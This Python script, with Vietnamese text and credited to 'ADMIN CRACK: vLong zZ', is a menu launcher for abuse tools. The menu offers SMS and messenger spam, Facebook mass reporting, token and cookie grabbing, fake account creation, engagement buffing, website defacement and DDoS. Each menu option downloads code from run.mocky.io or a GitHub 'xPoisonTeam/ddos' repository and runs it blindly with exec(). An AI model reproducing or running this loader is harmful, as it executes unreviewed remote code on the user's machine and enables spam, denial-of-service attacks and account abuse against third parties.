from random import choice, randint, shuffle
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
from os.path import isfile
import requests
import base64, json,os
from datetime import date
from time import sleep,strftime
from pystyle import *
from time import sleep 
import requests, random
import requests
import base64, json,os
from time import sleep,strftime
import re,requests,os,sys
from time import sleep 
import requests, random
import uuid, re
from pystyle import Write,Colors
import socket
from datetime import datetime
#màu
luc = "\033[1;32m"
trang = "\033[1;37m"
do = "\033[1;31m"
vang = "\033[0;93m"
hong = "\033[1;35m"
xduong = "\033[1;34m"
xnhac = "\033[1;36m"
red='\u001b[31;1m'
yellow='\u001b[33;1m'
green='\u001b[32;1m'
blue='\u001b[34;1m'
tim='\033[1;35m'
xanhlam='\033[1;36m'
xam='\033[1;30m'
black='\033[1;19m'
lamd = "\033[1;34m"
import os, sys
import requests
import os, sys
import time
from time import strftime
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
ip = requests.post('https://api.proxyscrape.com/ip.php').text
#Đánh Dấu Bản Quyền
HHoang_tool = trang + " " + trang + "[" + do + "+_+" + trang + "] " + trang + "=> "
HHoang = trang + " " + trang + "[" + do + "÷_+" + trang + "] " + trang + "=> "
thanh = trang + "-------------------------------------------------------------------------"

#today nand clear
os.system('cls')
data_machine = []
today = date.today()
os.system('clear')
#daystime
now = datetime.now()
thu = now.strftime("%A")
ngay_hom_nay = now.strftime("%d")
thang_nay = now.strftime("%m")
nam_ = now.strftime("%Y")
System.Clear()
System.Title("Vchhoang")
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
def get_ip_from_url(url):
    response = requests.get(url)
    ip_address = socket.gethostbyname(response.text.strip())
    return ip_address
url = "https://api.ipify.org/"
ip = get_ip_from_url(url)
a = " \033[1;97m[\033[1;31m#_+\033[1;97m] => "
Write.Print(' ➩  ADMIN CRACK : vLong zZ \n',Colors.blue_to_purple,interval=0.0001)
Write.Print(' \n',Colors.blue_to_purple,interval=0.0001,end='\r')
# ======================== [ HOME TOOL ] ========================
banner = f'''
'''
for h in banner:
       sys.stdout.write(h)
       sys.stdout.flush()
       sleep(0.0003)
a=now.strftime("%d")
h=int(now.strftime("%d"))
ngay_trc=h-2
b=now.strftime("%m")
day=now.strftime("%d-%m-%Y")
today=now.strftime("%d-%m-%Y")
d=now.strftime("%d-%m")
ngay=int(strftime('%d'))
time=datetime.now().strftime("%H:%M:%S")
hhoang = "\033[1;31m[\033[1;32m*_*\033[1;31m] \033[1;37m---\033[1;31m> \033[1;32m"
banner = f"""
\033[1;37m╔═════════════════════╗
\033[1;37m║  \033[1;33mMENNU              \033[1;37m║
\033[1;37m╚═════════════════════╝
{hhoang}ADMIN CRACK\033[1;97m: vLong zZ
{lamd} ➩ Ngày{trang}: {do}{ngay_hom_nay}{vang} |{luc} Tháng{trang}: {do}{thang_nay} {vang}| {luc}Năm{trang}: {do}{nam_}{vang} | {luc}Time: {do}{time} |
{lamd} ➩ IP Hiện Tại Của Bạn : {do}{ip}|
\033[1;31m────────────────────────────────────────────────────────────
\033[1;37m╔══════════════════════════╗
\033[1;37m║  \033[1;33mTool Công Cụ + Tiện Ích \033[1;37m║
\033[1;37m╚══════════════════════════╝
{hhoang}\033[1;31m[\033[1;33m1.1\033[1;31m] \033[1;32mTool Check Ngày Tạo Facebook
{hhoang}\033[1;31m[\033[1;33m1.3\033[1;31m] \033[1;32mTool Đào Proxy
{hhoang}\033[1;31m[\033[1;33m1.4\033[1;31m] \033[1;32mTool Get Token Profile-Pro5
{hhoang}\033[1;31m[\033[1;33m1.5\033[1;31m] \033[1;32mTool Chat GPT
{hhoang}\033[1;31m[\033[1;33m1.6\033[1;31m] \033[1;32mTool Lọc Live Proxy
{hhoang}\033[1;31m[\033[1;33m1.7\033[1;31m] \033[1;32mTool Đếm Lần Yêu
{hhoang}\033[1;31m[\033[1;33m1.8\033[1;31m] \033[1;32mTool Reg Acc Garena
\033[1;37m╔══════════════════════════╗
\033[1;37m║  \033[1;33mTool SPAM SMS           \033[1;37m║
\033[1;37m╚══════════════════════════╝
{hhoang}\033[1;31m[\033[1;33m1.95\033[1;31m] \033[1;32mSPAM SMS 
{hhoang}\033[1;31m[\033[1;33m2.0\033[1;31m] \033[1;32mSPAM SMS V2
\033[1;31m────────────────────────────────────────────────────────────
\033[1;37m╔═════════════════════╗
\033[1;37m║  \033[1;33mTool Mail          \033[1;37m║
\033[1;37m╚═════════════════════╝
{hhoang}\033[1;31m[\033[1;33m2.1\033[1;31m] \033[1;32mTool Đào Mail
{hhoang}\033[1;31m[\033[1;33m2.2\033[1;31m] \033[1;32mTool Lọc Mail Chuẩn 100%
{hhoang}\033[1;31m[\033[1;33m2.3\033[1;31m] \033[1;32mTool Mail V2
\033[1;31m────────────────────────────────────────────────────────────
\033[1;37m╔═════════════════════╗
\033[1;37m║  \033[1;33mTool Encode        \033[1;37m║
\033[1;37m╚═════════════════════╝
{hhoang}\033[1;31m[\033[1;33m3.1\033[1;31m] \033[1;32mTool Encode Emoji \033[0;31m
{hhoang}\033[1;31m[\033[1;33m3.2\033[1;31m] \033[1;32mTool Encode Berekheser \033[0;31m
{hhoang}\033[1;31m[\033[1;33m3.3\033[1;31m] \033[1;32mTool Encode Marshal \033[0;31m
\033[1;31m────────────────────────────────────────────────────────────
\033[1;37m╔═════════════════════╗
\033[1;37m║  \033[1;33mTool Linh Tinh     \033[1;37m║
\033[1;37m╚═════════════════════╝
{hhoang}\033[1;31m[\033[1;33m4.1\033[1;31m] \033[1;32mTool Spam Zalo
{hhoang}\033[1;31m[\033[1;33m4.2\033[1;31m] \033[1;32mTool Spam Messenger
{hhoang}\033[1;31m[\033[1;33m4.3\033[1;31m] \033[1;32mTool ?
{hhoang}\033[1;31m[\033[1;33m4.4\033[1;31m] \033[1;32mTool Nuôi Facebook
{hhoang}\033[1;31m[\033[1;33m4.5\033[1;31m] \033[1;32mTool Tố Cáo Facebook
{hhoang}\033[1;31m[\033[1;33m4.6\033[1;31m] \033[1;32mTool Spam Box Mess
{hhoang}\033[1;31m[\033[1;33m4.7\033[1;31m] \033[1;32mTool AUTO ADD KẾT BẠN 
\033[1;31m────────────────────────────────────────────────────────────
\033[1;37m╔═════════════════════╗
\033[1;37m║  \033[1;33mTool Pro5          \033[1;37m║
\033[1;37m╚═════════════════════╝
{hhoang}\033[1;31m[\033[1;33m5.1\033[1;31m] \033[1;32mTool REG PRO5 + UP AVT
{hhoang}\033[1;31m[\033[1;33m5.2\033[1;31m] \033[1;32mTool Get Cookie Pro5
{hhoang}\033[1;31m[\033[1;33m5.3\033[1;31m] \033[1;32mTool Buff View Story Pro5 
{hhoang}\033[1;31m[\033[1;33m5.4\033[1;31m] \033[1;32mTool Buff Reaction Str  Bằng Page Pro5
{hhoang}\033[1;31m[\033[1;33m5.5\033[1;31m] \033[1;32mTool Share Max Speed Bằng Token Pro5
{hhoang}\033[1;31m[\033[1;33m5.6\033[1;31m] \033[1;32mTool Buff Follow Bằng Page Pro5
{hhoang}\033[1;31m[\033[1;33m5.7\033[1;31m] \033[1;32mTool Buff Mem Group Bằng Page Pro5
{hhoang}\033[1;31m[\033[1;33m5.8\033[1;31m] \033[1;32mTool Chuyển Quyền Admin Page Pro5
{hhoang}\033[1;31m[\033[1;33m5.9\033[1;31m] \033[1;32mTool Buff Comment Pro5
{hhoang}\033[1;31m[\033[1;33m5.10\033[1;31m] \033[1;32mTool Kích Hoạt Pro5
\033[1;31m────────────────────────────────────────────────────────────
\033[1;37m╔═════════════════════╗
\033[1;37m║  \033[1;33mTool Trao Đổi Sub  \033[1;37m║
\033[1;37m╚═════════════════════╝
{hhoang}\033[1;31m[\033[1;33m6.1\033[1;31m] \033[1;32mTool TDS Cookie
{hhoang}\033[1;31m[\033[1;33m6.2\033[1;31m] \033[1;32mTool TDS Pro5 
{hhoang}\033[1;31m[\033[1;33m6.3\033[1;31m] \033[1;32mTool TDS Tiktok
{hhoang}\033[1;31m[\033[1;33m6.3\033[1;31m] \033[1;32mTool TDS Instagram \033[0;31m[Vip]
\033[1;31m────────────────────────────────────────────────────────────
\033[1;37m╔══════════════════════╗
\033[1;37m║  \033[1;33mTool Tương Tác Chéo \033[1;37m║
\033[1;37m╚══════════════════════╝
{hhoang}\033[1;31m[\033[1;33m7.1\033[1;31m] \033[1;32mTool TTC Cookie  \033[0;31m[Bảo Trì]
{hhoang}\033[1;31m[\033[1;33m7.2\033[1;31m] \033[1;32mTool TTC Pro5
{hhoang}\033[1;31m[\033[1;33m7.3\033[1;31m] \033[1;32mTool TTC Tiktok  \033[0;31m[Bảo Trì]
{hhoang}\033[1;31m[\033[1;33m7.4\033[1;31m] \033[1;32mTool Vipig
\033[1;31m────────────────────────────────────────────────────────────
\033[1;37m╔═════════════════════╗
\033[1;37m║  \033[1;33mTool TikTok        \033[1;37m║
\033[1;37m╚═════════════════════╝
{hhoang}\033[1;31m[\033[1;33m8.1\033[1;31m] \033[1;32mTool Buff View TikTok Proxy
{hhoang}\033[1;31m[\033[1;33m8.2\033[1;31m] \033[1;32mTool Buff Tim TikTok Zefoy
{hhoang}\033[1;31m[\033[1;33m8.3\033[1;31m] \033[1;32mTool Buff View TikTok Zefoy 
\033[1;31m────────────────────────────────────────────────────────────
\033[1;37m╔═════════════════════╗
\033[1;37m║  \033[1;33mTool FACEBOOK      \033[1;37m║
\033[1;37m╚═════════════════════╝
{hhoang}\033[1;31m[\033[1;33m9.1\033[1;31m] \033[1;32mTool REPORT FACEBOOK
{hhoang}\033[1;31m[\033[1;33m9.2\033[1;31m] \033[1;32mTool Get id Facebook\033[0;31m[Lỗi api]
{hhoang}\033[1;31m[\033[1;33m9.3\033[1;31m] \033[1;32mTool Share Cookie Pro5
{hhoang}\033[1;31m[\033[1;33m9.4\033[1;31m] \033[1;32mTool Get Token
{hhoang}\033[1;31m[\033[1;33m9.5\033[1;31m] \033[1;32mShare Token\033[0;31m[maxspeed]
{hhoang}\033[1;31m[\033[1;33m9.6\033[1;31m] \033[1;32m?
{hhoang}\033[1;31m[\033[1;33m9.7\033[1;31m] \033[1;32m?
\033[1;31m────────────────────────────────────────────────────────────
\033[1;37m╔═════════════════════╗
\033[1;37m║  \033[1;33mTool DEFACE+GOLIKE \033[1;37m║
\033[1;37m╚═════════════════════╝
{hhoang}\033[1;31m[\033[1;33m10.1\033[1;31m] \033[1;32mTOOL DEFACE
{hhoang}\033[1;31m[\033[1;33m10.2\033[1;31m] \033[1;32mTOOL GOLIKE
{hhoang}\033[1;31m[\033[1;33m10.3\033[1;31m] \033[1;32mTOOL GOLIKE \033[0;31m[V2]
\033[1;31m────────────────────────────────────────────────────────────
\033[1;37m╔═════════════════════╗
\033[1;37m║  \033[1;33mTool DDOS          \033[1;37m║
\033[1;37m╚═════════════════════╝
{hhoang}\033[1;31m[\033[1;33m11.1\033[1;31m] \033[1;32mSetup ddos
{hhoang}\033[1;31m[\033[1;33m11.2\033[1;31m] \033[1;32mTOOL DDOS v1
{hhoang}\033[1;31m[\033[1;33m11.3\033[1;31m] \033[1;32mTOOL DDOS v2
\033[1;31m────────────────────────────────────────────────────────────
{hhoang}\033[1;31m[\033[1;33m11.4\033[1;31m] \033[1;32mThoát Tool
\033[1;31m────────────────────────────────────────────────────────────
"""
print(banner)

print ("\033[1;31m    ╔═════════════════════╗")
print ("\033[1;31m╔═══║\033[1;33mVui Lòng Chọn Chế Độ:\033[1;31m║")
print ("\033[1;31m║   ╚═════════════════════╝")
chon = input("\033[1;31m╚══>\033[1;33m ")
#Tool Công Cụ + Tiện Ích
if chon == "1.1" :
    exec(requests.get('https://run.mocky.io/v3/52cf8552-c841-4ed5-a5db-d3d38f1f7b37').text)
if chon == "1.2" :
    exec(requests.get('//').text)
if chon == "1.3" :
    exec(requests.get('https://run.mocky.io/v3/64af82d6-fbc2-47ad-ae54-3c4bf7f02f68').text)
if chon == "1.4" :
    exec(requests.get('https://run.mocky.io/v3/6326831f-3a52-43ac-b436-1629492def0d').text)
if chon == "1.5" :
    exec(requests.get('https://run.mocky.io/v3/e9aef9f7-2dc3-4744-bb6a-85632aa3595e').text)
if chon == "1.6" :
    exec(requests.get('https://run.mocky.io/v3/b304fc70-7d42-433d-ae00-8afab5134d44').text)
if chon == "1.7" :
    exec(requests.get('https://run.mocky.io/v3/11c2d0cd-4e9f-453b-b495-8e06ceef557a').text)
if chon == "1.8" :
    exec(requests.get('https://run.mocky.io/v3/e86a066f-516f-4563-9c57-3781c4f9a87f').text)
#tool spam sms
if chon == "1.95" :
    exec(requests.get('https://run.mocky.io/v3/c7facd9e-4514-4311-b26b-eafc8d9da65c').text)
if chon == "2.0" :
    exec(requests.get('https://run.mocky.io/v3/066c9d03-9786-4566-baf0-f79e98a4493f').text)
#Tool Mail
if chon == "2.1" :
    exec(requests.get('https://run.mocky.io/v3/a57d7ecf-f725-4b80-a71e-4c4eb254545b').text)
if chon == "2.2" :
    exec(requests.get('https://run.mocky.io/v3/caa111c6-ae17-4eeb-bdbd-c75e074eb0a7').text)
if chon == "2.3" :
    exec(requests.get('https://run.mocky.io/v3/9c0f2e1d-5f61-4971-8e10-a69ecb44ef6f').text)
#Tool Encode
if chon == "3.1" :
    exec(requests.get('https://run.mocky.io/v3/380229c6-afc8-4535-b352-2352324d6414').text)
if chon == "3.2" :
    exec(requests.get('https://run.mocky.io/v3/98d7a8d7-16b4-40cd-bf3c-e90d01aab131').text)
if chon == "3.3" :
    exec(requests.get('https://run.mocky.io/v3/f2e111e2-7d5a-4eaf-b8fb-b01991a674d9').text)
#Tool Facebook
if chon == "4.1" :
    exec(requests.get('https://run.mocky.io/v3/beec1c05-9963-43b8-8550-56a1a6641802').text)
if chon == "4.2" :
    exec(requests.get('https://run.mocky.io/v3/7abb6eb7-df9c-4c22-b077-5e886fe1e16a').text)
if chon == "4.3" :
    exec(requests.get('https://run.mocky.io/v3/102e34f7-d357-4c6f-97cc-c33155d2359e').text)
if chon == "4.4" :
    exec(requests.get('https://run.mocky.io/v3/f65470b4-340f-4c92-90bb-69273ee748fb').text)
if chon == "4.5" :
    exec(requests.get('https://run.mocky.io/v3/9121ee1f-042d-4297-9d23-4f23555b10c9').text)
if chon == "4.6" :
    exec(requests.get('https://run.mocky.io/v3/03441eaf-ecfb-425d-9be3-761b807cbed2').text)
if chon == "4.7" :
    exec(requests.get('https://run.mocky.io/v3/fe1acb9d-9bf3-48f5-ba6b-b67450bcb8e5').text)
#Tool Pro5
if chon == "5.1" :
    exec(requests.get('https://run.mocky.io/v3/83458baf-3bed-4679-a8d8-bbee9d88fb6c').text)
if chon == "5.2" :
    exec(requests.get('https://run.mocky.io/v3/b1045229-5f96-49b5-9079-8f53b96c5ecc').text)
if chon == "5.3" :
    exec(requests.get('https://run.mocky.io/v3/1056cf19-14fc-4096-b636-94f45c7c6c95').text)
if chon == "5.4" :
    exec(requests.get('https://run.mocky.io/v3/7e0f7ecf-927e-4cfa-9ac3-c177b2c5c58a').text)
if chon == "5.5" :
    exec(requests.get('https://run.mocky.io/v3/ef9a4182-0159-407c-8742-cc121cf96ac8').text)
if chon == "5.6" :
    exec(requests.get('https://run.mocky.io/v3/5bb31ee7-4f3d-447e-b4b1-c9a569565128').text)
if chon == "5.7" :
    exec(requests.get('https://run.mocky.io/v3/165f7e3a-4593-4b29-a8e9-3e308b5978b2').text)
if chon == "5.8" :
    exec(requests.get('https://run.mocky.io/v3/12d73846-f9c9-4314-bf55-4eaa15974302').text)
if chon == "5.9" :
    exec(requests.get('https://run.mocky.io/v3/a5f956aa-48ca-4f7b-8e97-6b4925307b31').text)
if chon == "5.10" :
    exec(requests.get('https://run.mocky.io/v3/bbc0112c-03a1-4f0a-bdab-1ba07c7964de').text)
if chon == "6.1" :
    exec(requests.get('https://run.mocky.io/v3/0a0a25a2-2985-4d85-afe9-e49d50e51f1a').text)
if chon == "6.2" :
    exec(requests.get('https://run.mocky.io/v3/8ed4d315-46bb-462f-ad54-d5898dd34076').text)
if chon == "6.3" :
    exec(requests.get('https://run.mocky.io/v3/d6322f1e-0713-42dc-bbc4-c58565b444d0').text)
if chon == "6.4" :
    exec(requests.get('https://run.mocky.io/v3/b47d31ea-30fc-472f-ac28-6548949aa9ca').text)
if chon == "7.1" :
    exec(requests.get('///').text)
if chon == "7.2" :
    exec(requests.get('https://run.mocky.io/v3/dd7f9ccd-d9b8-4853-b327-83188a2c4e95').text)
if chon == "7.3" :
    exec(requests.get('//').text)
if chon == "7.4" :
    exec(requests.get('//').text)
if chon == "8.1" :
    exec(requests.get('https://run.mocky.io/v3/09470a90-1383-466f-a5a6-1c5035ad25ae').text)
if chon == "8.2" :
    exec(requests.get('https://run.mocky.io/v3/b4ae6044-f801-4522-b370-55c9ccd6ebfb').text)
if chon == "8.3" :
    exec(requests.get('https://run.mocky.io/v3/9e3e6f8e-3311-4f72-bddd-e2bc239be354').text)
if chon == "9.1" :
    exec(requests.get('https://run.mocky.io/v3/e1371d8c-6ce6-49e8-a1dc-0fe6cccc46c0').text)
if chon == "9.2" :
    exec(requests.get('https://run.mocky.io/v3/2bd4739c-281b-4554-b17a-7c641791cd8d').text)
if chon == "9.3" :
    exec(requests.get('https://run.mocky.io/v3/9225dee5-3c97-4c87-9928-fcc83e863507').text)
if chon == "9.4" :
    exec(requests.get('https://run.mocky.io/v3/c1d760e7-1965-4d3c-aa3e-f8f3b62bb499').text)
if chon == "9.5" :
    exec(requests.get('https://run.mocky.io/v3/798811f9-b09a-496e-a520-45685b98e3f3').text)
if chon == "9.6" :
    exec(requests.get('#').text)
if chon == "9.7" :
    exec(requests.get('#').text)
if chon == "10.1" :
    exec(requests.get('https://run.mocky.io/v3/d785e852-1a92-4ec4-8b0e-301d0035f089').text)
if chon == "10.2" :
    exec(requests.get('https://run.mocky.io/v3/95d8f2da-ced1-42d5-9361-a63a4af0ea78').text)
if chon == "10.3" :
    exec(requests.get('https://run.mocky.io/v3/0ac50aae-1b6f-4a76-a29d-5f95deda50ae').text)
if chon == "11.1" :
    exec(requests.get('https://raw.githubusercontent.com/xPoisonTeam/ddos/main/setup.py').text)
if chon == "11.2" :
    exec(requests.get('https://run.mocky.io/v3/4f03274c-9d5f-42fa-aaf4-78183a2fcfe3').text)
if chon == "11.3" :
    exec(requests.get('https://run.mocky.io/v3/866285ed-0c64-4bc5-a619-92c0aadc13f3').text)
if chon == "11.4" :
    exec(requests.get('https://run.mocky.io/v3/d9f3f264-4c83-45ab-8b58-839293c44a49').text)
else :
		sys.exit("hmm")